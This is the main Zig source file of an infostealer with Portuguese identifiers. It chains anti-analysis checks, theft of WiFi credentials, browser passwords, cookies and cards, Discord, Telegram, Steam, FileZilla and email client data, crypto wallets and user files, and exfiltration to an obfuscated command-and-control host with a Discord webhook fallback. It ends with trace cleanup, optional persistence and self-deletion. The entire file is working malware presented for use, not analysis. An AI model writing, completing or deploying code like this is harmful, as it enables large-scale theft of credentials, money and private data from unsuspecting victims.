const std = @import("std");
const furtivo = @import("furtivo.zig");
const extrair = @import("extrair.zig");
const sondar = @import("sondar.zig");
const capturar = @import("capturar.zig");
const cofrinho = @import("cofrinho.zig");
const firefox = @import("firefox.zig");
const saida = @import("saida.zig");
const coleta = @import("coleta.zig");
const ajuste = @import("ajuste.zig");
const obf = @import("obf.zig");

pub fn main() !void {
    // 1. Anti-Analysis & Stealth
    if (!furtivo.runAntiAnalysis()) {
        std.process.exit(0);
    }

    // ArenaAllocator: one-shot allocation, no individual frees needed.
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();
    const allocator = arena.allocator();

    // 2. Initialize collection
    var col = coleta.Coleta.init(allocator);
    defer col.deinit();

    // 3. System Probing
    if (ajuste.coletar_info_sistema) {
        sondar.getSystemInfo(allocator, &col);
    }

    // 4. Clipboard
    sondar.getClipboard(allocator, &col);

    // 5. WiFi credentials
    if (ajuste.roubar_wifi) {
        sondar.getWifi(allocator, &col);
    }

    // 6. Screenshot
    if (ajuste.tirar_captura) {
        sondar.takeScreenshot(allocator, &col);
    }

    // 7. Browser Extraction (passwords, cookies, cards, history)
    if (ajuste.roubar_navegadores) {
        extrair.tudo(allocator, &col);
        firefox.firefox(allocator, &col);
    }

    // 8. Application Capture
    if (ajuste.roubar_discord) {
        capturar.discord(allocator, &col);
    }
    if (ajuste.roubar_telegram) {
        capturar.telegram(allocator, &col);
    }
    if (ajuste.roubar_steam) {
        capturar.steam(allocator, &col);
    }
    if (ajuste.roubar_filezilla) {
        capturar.filezilla(allocator, &col);
    }
    if (ajuste.roubar_outlook) {
        capturar.outlook(allocator, &col);
    }
    if (ajuste.roubar_thunderbird) {
        capturar.thunderbird(allocator, &col);
    }

    // 9. Crypto Wallet Extraction
    if (ajuste.roubar_crypto) {
        cofrinho.extensions(allocator, &col);
        cofrinho.desktop(allocator, &col);
    }

    // 10. File Grabber
    var arquivos_grab: []coleta.ArquivoGrab = &.{};
    if (ajuste.pegador_arquivos) {
        const exts = ajuste.getExtensoes(allocator) catch &.{};
        defer {
            for (exts) |e| allocator.free(e);
            allocator.free(exts);
        }
        const paths = ajuste.getCaminhos(allocator) catch &.{};
        defer {
            for (paths) |p| allocator.free(p);
            allocator.free(paths);
        }
        arquivos_grab = sondar.pegarArquivos(allocator, exts, ajuste.tamanho_max_arquivo, paths) catch &.{};
        for (arquivos_grab) |f| {
            col.arquivos_grab.append(allocator, f) catch {};
        }
    }

    // 11. Exfiltration
    const c2_host = obf.dexor(allocator, ajuste.webhook_host_obf) catch try allocator.dupe(u8, "discord.com");
    defer allocator.free(c2_host);
    const c2_path = obf.dexor(allocator, ajuste.webhook_path_obf) catch try allocator.dupe(u8, "/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN");
    defer allocator.free(c2_path);
    saida.exfilWithFiles(allocator, &col, c2_host, c2_path, arquivos_grab);

    // 12. Cleanup temp artifacts
    const limpeza = @import("limpeza.zig");
    limpeza.limpar(allocator);

    // 13. Persistence (optional)
    // Self-delete renames the binary, so installing a Run key for the original
    // path would leave a dangling entry. When both are requested, self-delete
    // wins and persistence is skipped.
    if (ajuste.persistir and !ajuste.auto_destruir) {
        const fixar = @import("fixar.zig");
        fixar.install() catch {};
    }

    // 14. Self-destruct (optional)
    if (ajuste.auto_destruir) {
        const fixar = @import("fixar.zig");
        fixar.selfDelete() catch {};
    }
}
